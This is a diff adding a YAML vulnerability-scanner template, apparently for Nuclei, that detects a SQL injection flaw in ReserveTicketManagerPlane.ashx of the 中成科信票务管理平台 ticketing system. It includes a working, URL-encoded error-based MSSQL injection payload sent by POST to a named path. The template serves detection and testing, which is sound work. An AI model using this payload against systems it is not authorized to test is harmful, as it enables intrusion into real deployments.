@@ -1,0 +1,27 @@
+id: poc-yaml-zckx-reserveticketmanagerplane-ashx-sqli
+info:
+  name: ReserveTicketManagerPlane.ashx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL Injection vulnerability in ReserveTicketManagerPlane.ashx of the 中成科信票务管理平台.
+http:
+  - method: POST
+    path:
+      - "/SystemManager/Planetarium/ReserveTicketManagerPlane.ashx"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      Method=GetGuideByCode&inputType=20&codeValue=1%27+AND+7821+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%287821%3D7821%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29--+Vjyh
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "在将 varchar 值"
+          - "转换成数据类型 int 时失败"
+          - "SqlException"
+        part: body
